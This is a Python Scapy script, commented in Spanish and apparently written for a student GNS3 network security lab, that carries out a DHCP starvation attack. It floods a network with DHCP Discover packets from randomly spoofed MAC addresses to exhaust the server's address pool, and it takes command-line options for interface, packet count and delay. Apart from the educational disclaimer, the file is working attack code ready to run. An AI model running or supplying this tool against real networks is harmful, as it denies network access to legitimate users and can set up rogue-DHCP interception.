#!/usr/bin/env python3
# DHCP Starvation - Laboratorio de Seguridad de Redes
# Autor: Estudiante de Ciberseguridad
# Entorno: GNS3 (Ambiente Controlado)
# ADVERTENCIA: Uso exclusivamente educativo en entornos controlados.

from scapy.all import *
import random, time, sys, os, argparse


def random_mac():
    """Genera una MAC aleatoria."""
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])


def mac_to_bytes(mac):
    """Convierte MAC string a bytes para campo chaddr de BOOTP."""
    parts = bytes(int(x, 16) for x in mac.split(':'))
    return parts + b'\x00' * (16 - len(parts))


def dhcp_starvation(iface='eth0', count=200, delay=0.05):
    """
    Agota el pool DHCP enviando Discovers con MACs falsas aleatorias.
    Parametros:
        iface  (str)  : Interfaz de red
        count  (int)  : Numero de solicitudes DHCP Discover a enviar
        delay  (float): Pausa entre paquetes en segundos
    """
    print("=" * 60)
    print("  DHCP STARVATION - Laboratorio GNS3")
    print(f"  Interfaz: {iface} | Solicitudes: {count} | Delay: {delay}s")
    print("=" * 60)
    print("[*] Iniciando DHCP Starvation...")
    sent = 0
    failed = 0
    start_time = time.time()
    try:
        for i in range(count):
            fake_mac = random_mac()
            chaddr = mac_to_bytes(fake_mac)
            xid = random.randint(1, 0xFFFFFFFF)
            discover = (
                Ether(src=fake_mac, dst='ff:ff:ff:ff:ff:ff') /
                IP(src='0.0.0.0', dst='255.255.255.255') /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=chaddr, xid=xid, flags=0x8000) /
                DHCP(options=[
                    ('message-type', 'discover'),
                    ('hostname', f'host-{random.randint(1000,9999)}'),
                    ('param_req_list', [1, 3, 6, 15, 28, 51]),
                    'end'
                ])
            )
            try:
                sendp(discover, iface=iface, verbose=False)
                sent += 1
            except Exception:
                failed += 1
            if (sent + failed) % 50 == 0:
                elapsed = time.time() - start_time
                pps = sent / elapsed if elapsed > 0 else 0
                print(f"  [+] Enviados: {sent}/{count} | {pps:.1f} pkt/s")
            if delay > 0:
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n[!] Interrumpido.")
    elapsed = time.time() - start_time
    print(f"\n[+] DHCP Starvation completado.")
    print(f"[+] Discovers enviados: {sent} | Fallidos: {failed}")
    print(f"[+] Tiempo: {elapsed:.2f}s | Pool DHCP posiblemente agotado.")


if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit("[-] Requiere privilegios root.")
    parser = argparse.ArgumentParser(description='DHCP Starvation - GNS3')
    parser.add_argument('-i', '--interface', default='eth0')
    parser.add_argument('-c', '--count', type=int, default=200)
    parser.add_argument('-d', '--delay', type=float, default=0.05)
    args = parser.parse_args()
    dhcp_starvation(args.interface, args.count, args.delay)
